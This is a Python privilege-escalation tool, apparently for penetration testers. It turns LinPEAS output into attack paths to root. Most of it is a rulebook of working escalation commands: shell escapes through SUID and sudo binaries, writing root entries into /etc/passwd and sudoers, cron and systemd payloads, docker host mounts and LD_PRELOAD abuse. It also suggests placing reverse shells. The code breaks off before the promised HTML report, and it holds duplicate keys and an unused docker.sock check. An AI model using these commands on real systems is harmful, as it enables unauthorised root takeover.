#!/usr/bin/env python3
""" 
RootHound  -  LinPEAS -> privilege-escalation attack-path graph 

Reads a LinPEAS output file, matches
findings against an editable rulebook, and writes a single self-contained
HTML file that draws the paths from your current user to root -- colour-coded
by how confident we are the path works.

  python3 RootHound.py sample_linpeas.txt -o report.html

The RULEBOOK below is the brain. Grow it like NozeWhisper's rulebook:
the bigger and more accurate it is, the smarter the graph.
"""

import sys, os, re, json, argparse, html

# ─────────────────────────────────────────────────────────────────────────────
# RULEBOOK  -  edit / extend this freely. This is where the knowledge lives.
# ─────────────────────────────────────────────────────────────────────────────

# Binaries that give a root shell when they carry the SUID bit (GTFOBins: suid)
GTFOBINS_SUID = {
    "bash": "bash -p  ->  keeps euid=0",
    "sh": "sh -p",
    "find": "find . -exec /bin/sh -p \\; -quit",
    "vim": "vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
    "nano": "write to a root-owned file / read shadow",
    "less": "less /etc/profile then !/bin/sh",
    "more": "more /etc/profile then !/bin/sh",
    "nmap": "nmap --interactive then !sh  (old versions only)",
    "python": "python -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'",
    "python3": "python3 -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'",
    "perl": "perl -e 'exec \"/bin/sh\";'",
    "awk": "awk 'BEGIN{system(\"/bin/sh\")}'",
    "cp": "overwrite /etc/passwd or /etc/shadow",
    "env": "env /bin/sh -p",
    "tar": "tar checkpoint-action to run a command",
    "gdb": "gdb -nx -ex 'python import os;os.setuid(0)' -ex '!sh' -ex quit",
    "make": "make -s --eval=$'x:\\n\\t-'\"/bin/sh -p\"",
    "vi": "vi -c ':!/bin/sh -p'",
    "pkexec": "CVE-2021-4034 PwnKit (unpatched pkexec)",
    "base64": "read any file: base64 /etc/shadow | base64 -d",
    "cat": "read any root-owned file (/etc/shadow)",
    "chmod": "chmod u+s /bin/bash  then  bash -p",
    "chown": "chown to hijack a root-owned file",
    "cp": "overwrite /etc/passwd or /etc/shadow",
    "dd": "dd of=/etc/passwd  ->  write a root line",
    "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "ed": "ed then !/bin/sh -p",
    "emacs": "emacs -Q -nw --eval '(term \"/bin/sh -p\")'",
    "flock": "flock -u / /bin/sh -p",
    "head": "head -c1G /etc/shadow (read shadow)",
    "mount": "mount a crafted fs / abuse to root",
    "mv": "overwrite /etc/passwd via move",
    "openssl": "openssl enc read/write arbitrary files as root",
    "rsync": "rsync -e 'sh -p -c \"sh -p 0<&2 1>&2\"' 127.0.0.1:/dev/null",
    "sed": "sed -n '1e exec sh -p 1>&0' /etc/hosts",
    "sqlite3": "sqlite3 /dev/null '.shell /bin/sh -p'",
    "start-stop-daemon": "start-stop-daemon -n x -S -x /bin/sh -- -p",
    "strace": "strace -o /dev/null /bin/sh -p",
    "systemctl": "systemctl link/enable a malicious unit",
    "tac": "tac -s x /etc/shadow (read shadow)",
    "tail": "tail -c1G /etc/shadow (read shadow)",
    "tee": "echo data | tee -a /etc/passwd",
    "xxd": "xxd /etc/shadow | xxd -r (read shadow)",
    "zsh": "zsh  (keeps euid=0)",
    "ruby": "ruby -e 'Process::Sys.setuid(0);exec \"/bin/sh\"'",
    "node": "node -e 'process.setuid(0);require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'",
    "php": "php -r \"posix_setuid(0);system('/bin/sh');\"",
}

# Binaries that give root when you can run them via  sudo  (GTFOBins: sudo)
GTFOBINS_SUDO = {
    "find": "sudo find . -exec /bin/sh \\; -quit",
    "vim": "sudo vim -c ':!/bin/sh'",
    "vi": "sudo vi -c ':!/bin/sh'",
    "nano": "sudo nano  ->  ^R^X  reset; sh 1>&0 2>&0",
    "less": "sudo less /etc/profile then !/bin/sh",
    "more": "sudo more /etc/profile then !/bin/sh",
    "man": "sudo man man then !/bin/sh",
    "awk": "sudo awk 'BEGIN{system(\"/bin/sh\")}'",
    "python": "sudo python -c 'import os;os.system(\"/bin/sh\")'",
    "python3": "sudo python3 -c 'import os;os.system(\"/bin/sh\")'",
    "perl": "sudo perl -e 'exec \"/bin/sh\";'",
    "tar": "sudo tar -cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "service": "sudo service ../../bin/sh  ->  runs sh as root",
    "systemctl": "sudo systemctl -> pager escape !sh",
    "env": "sudo env /bin/sh",
    "make": "sudo make -s --eval=$'x:\\n\\t-/bin/sh'",
    "apt": "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh",
    "ftp": "sudo ftp then !/bin/sh",
    "less": "sudo less /etc/profile then !/bin/sh",
    "more": "sudo more /etc/profile then !/bin/sh",
    "git": "sudo git -p help config then !/bin/sh   (or -c core.pager)",
    "ssh": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
    "zip": "sudo zip x /etc/hosts -T -TT 'sh #'",
    "rsync": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
    "sed": "sudo sed -n '1e sh 1>&0' /etc/hosts",
    "cp": "sudo cp your_passwd /etc/passwd   (overwrite as root)",
    "dd": "sudo dd if=your_file of=/etc/passwd",
    "tee": "echo '<you> ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers",
    "wget": "sudo wget --use-askpass=/tmp/evil x   (or overwrite a root file)",
    "curl": "sudo curl file:///etc/shadow   (read root files)",
    "gdb": "sudo gdb -nx -ex '!sh' -ex quit",
    "docker": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "mount": "sudo mount -o bind /bin/sh /bin/mount abuse (situational)",
    "openssl": "sudo openssl to read/write arbitrary root files",
    "busybox": "sudo busybox sh",
    "chmod": "sudo chmod u+s /bin/bash  ->  bash -p",
    "chown": "sudo chown <you> /etc/passwd  ->  edit it",
    "nano": "sudo nano  then  ^R^X  reset; sh 1>&0 2>&0",
}

# (binary, capability) -> technique     (GTFOBins: capabilities)
GTFOBINS_CAPS = {
    ("python", "cap_setuid"): "os.setuid(0); os.system('/bin/sh')",
    ("python3", "cap_setuid"): "os.setuid(0); os.system('/bin/sh')",
    ("perl", "cap_setuid"): "POSIX::setuid(0); exec '/bin/sh'",
    ("php", "cap_setuid"): "posix_setuid(0); system('/bin/sh')",
    ("ruby", "cap_setuid"): "Process::Sys.setuid(0); exec '/bin/sh'",
    ("node", "cap_setuid"): "process.setuid(0); child_process spawn sh",
    ("vim", "cap_setuid"): "py3 os.setuid(0) then shell",
    ("gdb", "cap_setuid"): "call setuid(0) then shell",
    ("*", "cap_dac_read_search"): "read any file incl. /etc/shadow (cap_dac_read_search)",
    ("*", "cap_dac_override"): "overwrite any file incl. /etc/passwd (cap_dac_override)",
    ("*", "cap_sys_admin"): "very broad - mount/namespace escapes (cap_sys_admin)",
    ("*", "cap_sys_ptrace"): "inject into a root process (cap_sys_ptrace)",
    ("*", "cap_sys_module"): "load a kernel module -> instant root (cap_sys_module)",
    ("*", "cap_chown"): "chown /etc/passwd to yourself, then edit it (cap_chown)",
    ("*", "cap_fowner"): "bypass permission checks on files you don't own (cap_fowner)",
    ("*", "cap_setgid"): "setgid(0) - group root, often chains to full root",
    ("openssl", "cap_setuid"): "openssl with setuid engine -> root",
    ("tar", "cap_dac_read_search"): "tar can read any file with dac_read_search",
}

# Group membership that leads to root
DANGEROUS_GROUPS = {
    "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "lxd": "import alpine image, mount host / into container, chroot",
    "lxc": "same as lxd - mount host / via privileged container",
    "disk": "debugfs /dev/sda -> read /etc/shadow (raw disk access)",
    "adm": "read log files (may leak creds) - not direct root",
    "shadow": "read /etc/shadow directly -> crack root hash",
    "video": "read framebuffer - low value",
    "sudo": "you are in sudo group - check sudo -l",
    "wheel": "wheel group - often maps to sudo",
    "kvm": "raw access to /dev/kvm - VM-based abuse, situational",
    "lxd-agent": "lxd-adjacent - treat like lxd",
    "root": "secondary root group membership - check group-writable root files",
}

# Sensitive files that = root if you can write them
SENSITIVE_WRITABLE = {
    "/etc/passwd": "add a root user: echo 'r00t:$1$abc$Xxb...:0:0::/root:/bin/bash' >> /etc/passwd  (openssl passwd -1)",
    "/etc/shadow": "overwrite root's hash with a known one (openssl passwd -6)",
    "/etc/sudoers": "add: <you> ALL=(ALL) NOPASSWD:ALL",
    "/etc/ld.so.preload": "point it at a malicious .so; loaded into every SUID binary -> root",
    "/root": "writable /root - drop /root/.ssh/authorized_keys or a .bashrc payload",
    "/etc/crontab": "add: * * * * * root cp /bin/bash /tmp/b; chmod +s /tmp/b",
    "/etc/profile": "runs for every login shell - drop a payload that fires when root logs in",
}

# Prefix-match writable files -> abuse (checked when exact match misses)
SENSITIVE_WRITABLE_DIRS = {
    "/etc/sudoers.d/": "drop a file: echo '<you> ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/x",
    "/etc/cron.d/": "drop a job: echo '* * * * * root chmod +s /bin/bash' > /etc/cron.d/x",
    "/etc/cron.daily/": "drop a root-run script here",
    "/etc/cron.hourly/": "drop a root-run script here",
    "/etc/systemd/system/": "drop/modify a .service with ExecStart=your payload -> runs as root",
}

# Binaries that give root/root-group when they carry the SGID bit (GTFOBins: sgid)
GTFOBINS_SGID = {
    "bash": "bash -p (egid=0 in many setups)",
    "find": "find . -exec /bin/sh -p \\; -quit",
    "python": "python -c 'import os,pty;os.setegid(0);pty.spawn(\"/bin/sh\")'",
    "python3": "python3 -c 'import os,pty;os.setegid(0);pty.spawn(\"/bin/sh\")'",
    "perl": "perl -e 'exec \"/bin/sh\";'",
    "awk": "awk 'BEGIN{system(\"/bin/sh\")}'",
    "vim": "vim -c ':!/bin/sh'",
    "less": "less /etc/profile then !/bin/sh",
    "nmap": "nmap --interactive then !sh (old)",
    "cat": "read group-readable secrets (e.g. /etc/shadow if group=shadow)",
}

# ── Kernel LPE by version: (name, cve, lo_inclusive, hi_exclusive, note) ──
# NOTE: version alone is NOT proof - distros backport fixes. Flagged as LIKELY.
KERNEL_CVES = [
    ("DirtyCow", "CVE-2016-5195", (2,6,22), (4,8,3),
     "Classic COW race. wget the PoC, overwrites read-only root files. Old but reliable on legacy boxes."),
    ("DirtyPipe", "CVE-2022-0847", (5,8,0), (5,16,11),
     "Overwrite ANY read-only file (/etc/passwd) or a root SUID binary. Very reliable, public PoC."),
    ("OverlayFS", "CVE-2023-0386", (5,11,0), (6,2,0),
     "overlayfs cap copy-up -> SUID root binary. Ubuntu/Debian common."),
    ("nf_tables double-free", "CVE-2024-1086", (5,14,0), (6,8,0),
     "Netfilter nf_tables -> root. Needs unprivileged user namespaces (default on many desktops). In CISA KEV."),
    ("nf_tables UAF", "CVE-2023-32233", (0,0,0), (6,3,2),
     "Netfilter nf_tables use-after-free -> root (kernels <= 6.3.1)."),
]

# ── Sudo LPE by version: (name, cve, [(lo,hi_excl),...], note) ──
SUDO_CVES = [
    ("Baron Samedit", "CVE-2021-3156", [((1,7,7),(1,7,11)),((1,8,2),(1,8,32)),((1,9,0),(1,9,6))],
     "Heap overflow via 'sudoedit -s \\\\'. Root WITHOUT any sudo rule. Public PoC (blasty/worawit)."),
    ("sudoedit extra-args", "CVE-2023-22809", [((1,8,0),(1,9,13))],
     "Only if you may run sudoedit/sudo -e: EDITOR='vim -- /etc/sudoers' appends a file you edit as root."),
    ("sudo chroot NSS", "CVE-2025-32463", [((1,9,14),(1,9,18))],
     "sudo -R <dir> loads an attacker NSS .so as root. CVSS 9.3. No sudo rule needed."),
    ("sudo host bypass", "CVE-2025-32462", [((1,8,8),(1,8,33)),((1,9,0),(1,9,18))],
     "If sudoers rules are host/hostname-restricted, sudo -h may bypass them -> root."),
]

def _vt(s):
    """'5.16.11-generic' -> (5,16,11) ; '1.9.15p5' -> (1,9,15). Best-effort."""
    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", s or "")
    if not m: return None
    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0))

def kernel_cve_matches(kver):
    v = _vt(kver)
    if not v: return []
    return [(n,c,note) for (n,c,lo,hi,note) in KERNEL_CVES if lo <= v < hi]

def sudo_cve_matches(sver):
    v = _vt(sver)
    if not v: return []
    out = []
    for (n,c,ranges,note) in SUDO_CVES:
        if any(lo <= v < hi for (lo,hi) in ranges):
            out.append((n,c,note))
    return out

# Kernel versions worth an exploit look (very rough - LES is the real check)
def kernel_note(ver):
    return ("Old kernel - run linux-exploit-suggester / check DirtyPipe "
            "(5.8-5.16.11), DirtyCow (<4.8.3), OverlayFS, PwnKit. "
            "Kernel exploits are noisy/unreliable - last resort.")

# ─────────────────────────────────────────────────────────────────────────────
# PARSER  -  pull structured findings out of the LinPEAS text
# ─────────────────────────────────────────────────────────────────────────────

ANSI = re.compile(r"\x1b\[[0-9;]*m")

def strip_ansi(t):
    return ANSI.sub("", t)

def basename_noext(path):
    b = os.path.basename(path.strip())
    # find2.7 -> find, python3.8 -> python3 (keep major), vim.basic -> vim
    b = re.sub(r"\.basic$", "", b)
    return b

def norm_bin(b):
    b = basename_noext(b)
    m = re.match(r"^(python|perl|ruby|php|node)\d?(\.\d+)?$", b)
    if m:
        # python3.8 -> python3 ; python2.7 -> python ; keep the major digit if 3
        maj = re.match(r"^([a-z]+)(\d)?", b)
        if maj and maj.group(2) == "3":
            return maj.group(1) + "3"
        return maj.group(1) if maj else b
    return b

def parse_linpeas(text):
    t = strip_ansi(text)
    lines = t.splitlines()
    f = {
        "user": "current-user", "groups": [], "kernel": None,
        "sudo": [], "suid": [], "sgid": [], "caps": [], "cron": [],
        "writable": [], "writable_systemd": [],
        "sudo_version": None, "ld_preload": False, "nfs": [], "path_hijack": [],
    }

    # user + groups
    for ln in lines:
        m = re.search(r"uid=\d+\(([^)]+)\).*groups=(.+)", ln)
        if m:
            f["user"] = m.group(1)
            f["groups"] = re.findall(r"\d+\(([^)]+)\)", m.group(2))
            break

    # kernel
    for ln in lines:
        m = re.search(r"Linux version (\d+\.\d+\.\d+[-\w]*)", ln)
        if m:
            f["kernel"] = m.group(1)
            break

    # sudo version
    for ln in lines:
        m = re.search(r"[Ss]udo version (\d+\.\d+\.\d+\w*)", ln)
        if m:
            f["sudo_version"] = m.group(1)
            break

    # ── Robust, format-independent scan ──────────────────────────────────
    # We pattern-match the finding LINES directly instead of trusting section
    # headers (which change between LinPEAS versions and now carry T-codes).
    f["sudo_all"] = False
    writable_section = False

    for ln in lines:
        low = ln.lower()
        s = ln.strip()

        # SUDO grants:  "(ALL) NOPASSWD: /usr/bin/vim"  /  "u ALL=(ALL) NOPASSWD: /bin/x"
        sm = re.search(r"\((?:ALL|root)[^)]*\)\s*(?:(?:NOPASSWD|SETENV|PASSWD|NOEXEC):\s*)*(.+?)\s*$", ln)
        if sm and "may run" not in low and "matching defaults" not in low:
            cmd = sm.group(1).strip()
            if cmd in ("ALL", "ALL ALL"):
                f["sudo_all"] = True
            else:
                for p in re.findall(r"/[^\s,]+", cmd):
                    f["sudo"].append(p)

        # SUID / SGID binaries:  "-rwsr-xr-x ... /usr/bin/find --->" (perm[3]=SUID, perm[6]=SGID)
        if re.match(r"^-[rwxsStT-]{9}\b", s):
            perm = s[:10]
            pm = re.search(r"\s(/[^\s]+)", ln)
            if pm:
                if perm[3] in "sS":
                    f["suid"].append(pm.group(1))
                if perm[6] in "sS":
                    f["sgid"].append(pm.group(1))

        # Capabilities:  "/usr/bin/python3.11 = cap_setuid+ep"  or  "... cap_setuid=ep"
        if "cap_" in low and "http" not in low:
            cm = re.search(r"(/\S+)\s*(?:=\s*)?(cap_[a-z_]+)", ln)
            if cm:
                f["caps"].append((cm.group(1), cm.group(2)))

        # sudo env_keep leaks LD_PRELOAD / LD_LIBRARY_PATH -> classic root
        if "env_keep" in low and ("ld_preload" in low or "ld_library_path" in low):
            f["ld_preload"] = True

        # NFS export with no_root_squash -> mount remotely, drop a SUID root binary
        if "no_root_squash" in low:
            nm = re.search(r"(/\S+)\s+.*no_root_squash", ln)
            if nm:
                f["nfs"].append(nm.group(1))
            elif s and not s.startswith("#"):
                f["nfs"].append(s.split()[0])

        # Writable directories that grant root (sudoers.d, cron.d, systemd, ...)
        for d, _ in SENSITIVE_WRITABLE_DIRS.items():
            if d.rstrip("/") in ln and "writ" in low:
                f["writable"].append(d.rstrip("/"))

        # PATH hijack: a writable directory that sits in PATH
        if ("writable" in low and "path" in low) and re.search(r"(/\S+)", ln):
            for d in re.findall(r"(/[^\s:,]+)", ln):
                if d not in ("/usr/bin", "/bin", "/usr/sbin", "/sbin"):
                    f["path_hijack"].append(d)

        # Root cron:  "* * * * * root /opt/backup.sh"  or  "@reboot root /x"
        crm = re.search(r"^\s*(?:[\d*/,\-]+\s+){5}root\s+(/\S+)", ln) \
              or re.search(r"^\s*@\w+\s+root\s+(/\S+)", ln)
        if crm:
            f["cron"].append(crm.group(1))

        # Writable /etc/passwd (however LinPEAS phrases it)
        if "/etc/passwd" in ln and ("writ" in low or s == "/etc/passwd"):
            f["writable"].append("/etc/passwd")
        for sens in ("/etc/shadow", "/etc/sudoers"):
            if sens in ln and "writ" in low:
                f["writable"].append(sens)

        # Writable systemd unit
        if ".service" in ln and "writ" in low:
            svm = re.search(r"(/\S+\.service)", ln)
            if svm:
                f["writable_systemd"].append(svm.group(1))

        # Writable-files list (bare paths under that section)
        if "writable files" in low or "interesting writable" in low \
           or ("writable" in low and "folder" in low):
            writable_section = True; continue
        if "╔" in ln:
            writable_section = False
        if writable_section and s.startswith("/") and " " not in s:
            f["writable"].append(s)

    # dedupe, keep order
    for k in ("sudo", "suid", "sgid", "cron", "writable", "writable_systemd", "nfs", "path_hijack"):
        seen = set(); f[k] = [x for x in f[k] if not (x in seen or seen.add(x))]
    seen = set(); f["caps"] = [c for c in f["caps"] if not (c in seen or seen.add(c))]

    return f

# ─────────────────────────────────────────────────────────────────────────────
# GRAPH BUILDER  -  findings + rulebook  ->  nodes + edges (with severity)
# ─────────────────────────────────────────────────────────────────────────────
# severity: "confirmed" (red, known technique) | "likely" (amber) | "info" (blue)

def build_graph(f):
    nodes, edges, paths = {}, [], []
    START, ROOT = "start", "root"
    nodes[START] = {"id": START, "label": f"YOU\n{f['user']}", "kind": "start"}
    nodes[ROOT]  = {"id": ROOT,  "label": "ROOT\nuid=0",       "kind": "root"}

    def node(nid, label, kind):
        if nid not in nodes:
            nodes[nid] = {"id": nid, "label": label, "kind": kind}
        return nid

    def edge(a, b, sev, tech):
        edges.append({"source": a, "target": b, "severity": sev, "tech": tech})

    def record_path(hops, sev, summary):
        paths.append({"hops": hops, "severity": sev, "summary": summary})

    # full sudo:  (ALL : ALL) ALL  ->  instant root
    if f.get("sudo_all"):
        nid = node("sudo:ALL", "sudo\nALL commands", "sudo")
        edge(START, nid, "confirmed", "(ALL) ALL")
        edge(nid, ROOT, "confirmed", "sudo su -  (may run any command as root)")
        record_path([START, nid, ROOT], "confirmed", "sudo ALL  ->  root  (sudo su -)")

    # sudo rules
    for path in f["sudo"]:
        b = norm_bin(path)
        nid = node("sudo:" + b, f"sudo\n{b}", "sudo")
        edge(START, nid, "confirmed" if b in GTFOBINS_SUDO else "likely",
             "may run as root via sudo")
        if b in GTFOBINS_SUDO:
            edge(nid, ROOT, "confirmed", GTFOBINS_SUDO[b])
            record_path([START, nid, ROOT], "confirmed",
                        f"sudo {b}  ->  root  ({GTFOBINS_SUDO[b]})")
        else:
            edge(nid, ROOT, "likely", "runnable as root - check GTFOBins/behaviour")
            record_path([START, nid, ROOT], "likely",
                        f"sudo {b}  ->  root?  (not in rulebook - check manually)")

    # SUID binaries
    for path in f["suid"]:
        b = norm_bin(path)
        if b in GTFOBINS_SUID:
            nid = node("suid:" + b, f"SUID\n{b}", "suid")
            edge(START, nid, "confirmed", "SUID root binary")
            edge(nid, ROOT, "confirmed", GTFOBINS_SUID[b])
            record_path([START, nid, ROOT], "confirmed",
                        f"SUID {b}  ->  root  ({GTFOBINS_SUID[b]})")
        else:
            nid = node("suid:" + b, f"SUID\n{b}", "info")
            edge(START, nid, "info", "SUID root binary (not a known GTFOBins win)")

    # SGID binaries
    for path in f.get("sgid", []):
        b = norm_bin(path)
        if b in GTFOBINS_SGID:
            nid = node("sgid:" + b, f"SGID\n{b}", "suid")
            edge(START, nid, "confirmed", "SGID binary")
            edge(nid, ROOT, "confirmed", GTFOBINS_SGID[b])
            record_path([START, nid, ROOT], "confirmed",
                        f"SGID {b}  ->  root/root-group  ({GTFOBINS_SGID[b]})")

    # capabilities
    for path, cap in f["caps"]:
        b = norm_bin(path)
        cap_core = re.split(r"[+,]", cap)[0]
        key = (b, cap_core)
        star = ("*", cap_core)
        tech = GTFOBINS_CAPS.get(key) or GTFOBINS_CAPS.get(star)
        nid = node("cap:" + b, f"cap\n{b}\n{cap_core}", "cap")
        if tech:
            edge(START, nid, "confirmed", cap)
            edge(nid, ROOT, "confirmed", tech)
            record_path([START, nid, ROOT], "confirmed", f"{b} {cap_core}  ->  root  ({tech})")
        else:
            edge(START, nid, "likely", cap)
            edge(nid, ROOT, "likely", "capability set - check GTFOBins")

    # dangerous groups
    for g in f["groups"]:
        if g in DANGEROUS_GROUPS:
            nid = node("grp:" + g, f"group\n{g}", "group")
            direct = g in ("docker", "lxd", "lxc", "disk", "shadow")
            edge(START, nid, "confirmed" if direct else "likely", f"member of {g}")
            edge(nid, ROOT, "confirmed" if direct else "likely", DANGEROUS_GROUPS[g])
            if direct:
                record_path([START, nid, ROOT], "confirmed",
                            f"group {g}  ->  root  ({DANGEROUS_GROUPS[g]})")

    # writable docker socket (same power as docker group)
    if f.get("docker_sock"):
        nid = node("docksock", "docker.sock\nwritable", "group")
        edge(START, nid, "confirmed", "writable /var/run/docker.sock")
        edge(nid, ROOT, "confirmed", "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh")
        record_path([START, nid, ROOT], "confirmed", "writable docker.sock  ->  root")

    # writable sensitive files (exact matches)
    for w in f["writable"]:
        if w in SENSITIVE_WRITABLE:
            nid = node("wr:" + w, f"writable\n{w}", "file")
            edge(START, nid, "confirmed", "writable by us")
            edge(nid, ROOT, "confirmed", SENSITIVE_WRITABLE[w])
            record_path([START, nid, ROOT], "confirmed",
                        f"write {w}  ->  root  ({SENSITIVE_WRITABLE[w]})")
        else:
            # writable directory that grants root (/etc/sudoers.d, /etc/cron.d, ...)
            for d, tech in SENSITIVE_WRITABLE_DIRS.items():
                if w == d.rstrip("/") or w.startswith(d):
                    nid = node("wrd:" + w, f"writable dir\n{w}", "file")
                    edge(START, nid, "confirmed", "writable directory")
                    edge(nid, ROOT, "confirmed", tech)
                    record_path([START, nid, ROOT], "confirmed", f"write {w}/  ->  root  ({tech})")
                    break

    # writable script run by a root cron job  (multi-hop!)
    writ = set(f["writable"])
    for script in f["cron"]:
        nid = node("cron:" + script, f"cron\n{script}", "cron")
        if script in writ:
            fid = node("wr:" + script, f"writable\n{script}", "file")
            edge(START, fid, "confirmed", "writable by us")
            edge(fid, nid, "confirmed", "executed by root cron")
            edge(nid, ROOT, "confirmed", "put a reverse shell / chmod +s bash inside it")
            record_path([START, fid, nid, ROOT], "confirmed",
                        f"write {script}  ->  root cron runs it  ->  root")
        else:
            edge(START, nid, "info", "root cron job (not writable by us) - watch with pspy")

    # writable systemd unit
    for unit in f["writable_systemd"]:
        nid = node("svc:" + unit, f"systemd\n{os.path.basename(unit)}", "svc")
        edge(START, nid, "confirmed", "writable unit")
        edge(nid, ROOT, "confirmed", "set ExecStart=reverse shell; runs as root on start/boot")
        record_path([START, nid, ROOT], "confirmed", f"write {unit}  ->  root (systemd)")

    # sudo env_keep LD_PRELOAD / LD_LIBRARY_PATH
    if f.get("ld_preload"):
        nid = node("ldpreload", "sudo\nLD_PRELOAD kept", "sudo")
        edge(START, nid, "confirmed", "env_keep += LD_PRELOAD")
        edge(nid, ROOT, "confirmed", "compile evil.so, sudo LD_PRELOAD=./evil.so <any allowed cmd> -> root")
        record_path([START, nid, ROOT], "confirmed", "sudo keeps LD_PRELOAD  ->  root")

    # NFS no_root_squash
    for share in f.get("nfs", []):
        nid = node("nfs:" + share, f"NFS\n{share}\nno_root_squash", "file")
        edge(START, nid, "confirmed", "exported no_root_squash")
        edge(nid, ROOT, "confirmed", "mount from an attacker box as root, drop a SUID root binary in the share")
        record_path([START, nid, ROOT], "confirmed", f"NFS {share} no_root_squash  ->  root")

    # PATH hijack (writable dir in PATH)
    for d in f.get("path_hijack", []):
        nid = node("path:" + d, f"PATH\n{d}\nwritable", "file")
        edge(START, nid, "likely", "writable & in PATH")
        edge(nid, ROOT, "likely", "if a root process calls a relative binary, plant it here")
        record_path([START, nid, ROOT], "likely", f"writable PATH dir {d}  ->  root (if root runs a relative binary)")

    # kernel version -> CVE matches (LIKELY - version alone isn't proof; distros backport)
    if f["kernel"]:
        matches = kernel_cve_matches(f["kernel"])
        if matches:
            for (name, cve, note) in matches:
                nid = node("kcve:" + cve, f"{name}\n{cve}", "cve")
                edge(START, nid, "likely", f"kernel {f['kernel']}")
                edge(nid, ROOT, "likely", note)
                record_path([START, nid, ROOT], "likely", f"kernel {f['kernel']} may be vuln to {name} ({cve})")
        else:
            nid = node("kernel", f"kernel\n{f['kernel']}", "info")
            edge(START, nid, "info", kernel_note(f["kernel"]))

    # sudo version -> CVE matches (LIKELY)
    if f.get("sudo_version"):
        for (name, cve, note) in sudo_cve_matches(f["sudo_version"]):
            nid = node("scve:" + cve, f"{name}\n{cve}", "cve")
            edge(START, nid, "likely", f"sudo {f['sudo_version']}")
            edge(nid, ROOT, "likely", note)
            record_path([START, nid, ROOT], "likely", f"sudo {f['sudo_version']} may be vuln to {name} ({cve})")

    # ── attach "what is it / how to abuse it" to every node (BloodHound-style) ──
    cron_set = set(f["cron"])
    for n in nodes.values():
        nid = n["id"]
        n["desc"] = n.get("desc", ""); n["abuse"] = n.get("abuse", ""); n["ref"] = n.get("ref", "")
        if nid == "start":
            n["desc"] = "Your current foothold — the low-privilege user you landed as. Every path below starts here."
        elif nid == "root":
            n["desc"] = "The goal: uid=0 / full root. Every red path ends here."
        elif nid == "sudo:ALL":
            n["desc"] = "You can run ANY command as root via sudo."
            n["abuse"] = "sudo -i          # or: sudo su -"
            n["ref"] = "https://gtfobins.github.io/"
        elif nid.startswith("sudo:"):
            b = nid[5:]
            n["desc"] = f"You may run '{b}' as root via sudo (NOPASSWD). If '{b}' can spawn a shell or write files, that's root."
            n["abuse"] = GTFOBINS_SUDO.get(b, f"sudo {b}    # not in rulebook — check GTFOBins for an escape")
            n["ref"] = f"https://gtfobins.github.io/gtfobins/{b}/#sudo"
        elif nid.startswith("suid:"):
            b = nid[5:]
            n["desc"] = f"'{b}' has the SUID bit, so it runs as its owner (root) no matter who launches it."
            n["abuse"] = GTFOBINS_SUID.get(b, f"{b}    # no known GTFOBins SUID escape — investigate manually")
            n["ref"] = f"https://gtfobins.github.io/gtfobins/{b}/#suid"
        elif nid.startswith("sgid:"):
            b = nid[5:]
            n["desc"] = f"'{b}' has the SGID bit — it runs with its owning group's privileges (often root or a sensitive group)."
            n["abuse"] = GTFOBINS_SGID.get(b, f"{b}    # check GTFOBins for an sgid escape")
            n["ref"] = f"https://gtfobins.github.io/gtfobins/{b}/#sgid"
        elif nid.startswith("cap:"):
            b = nid[4:]; capname = ""; tech = ""
            for (p, cap) in f["caps"]:
                if norm_bin(p) == b:
                    capname = re.split(r"[+,=]", cap)[0]
                    tech = GTFOBINS_CAPS.get((b, capname)) or GTFOBINS_CAPS.get(("*", capname)) or ""
                    break
            n["desc"] = f"'{b}' carries the {capname} capability — a targeted root-ish power baked into the binary."
            n["abuse"] = tech or f"{b} has {capname} — check GTFOBins capabilities page."
            n["ref"] = f"https://gtfobins.github.io/gtfobins/{b}/#capabilities"
        elif nid.startswith("grp:"):
            g = nid[4:]
            n["desc"] = f"Your user is a member of the '{g}' group, which grants root-equivalent power on this box."
            n["abuse"] = DANGEROUS_GROUPS.get(g, "")
            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html"
        elif nid == "docksock":
            n["desc"] = "/var/run/docker.sock is writable — you can talk to the Docker daemon (runs as root) directly."
            n["abuse"] = "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html"
        elif nid.startswith("wr:"):
            path = nid[3:]
            if path in SENSITIVE_WRITABLE:
                n["desc"] = f"{path} is writable by your user — a sensitive system file you shouldn't be able to touch."
                n["abuse"] = SENSITIVE_WRITABLE[path]
            elif path in cron_set:
                n["desc"] = f"{path} is writable by you AND executed by root's cron. Whatever you put inside runs as root."
                n["abuse"] = (f"echo 'chmod +s /bin/bash' >> {path}\n"
                              f"# wait for the next cron run, then:\nbash -p\n"
                              f"# (or drop a reverse shell inside {path})")
            else:
                n["desc"] = f"{path} is writable by your user."
                n["abuse"] = "Root only if something privileged runs it — check cron, systemd, or another user."
        elif nid.startswith("cron:"):
            path = nid[5:]
            n["desc"] = f"Root's cron runs {path} on a schedule. If you can write that file, its contents run as root."
            n["abuse"] = (f"# if {path} is writable:\n"
                          f"echo 'chmod +s /bin/bash' >> {path}\n"
                          f"# wait for cron, then: bash -p\n"
                          f"# tip: watch cron timing without root using  pspy")
        elif nid.startswith("svc:"):
            unit = nid[4:]; base = os.path.basename(unit)
            n["desc"] = f"The systemd unit {unit} is writable. systemd runs units as root."
            n["abuse"] = (f"# point ExecStart at your payload, then:\n"
                          f"systemctl daemon-reload\nsystemctl start {base}\n"
                          f"# runs as root now (and on next boot)")
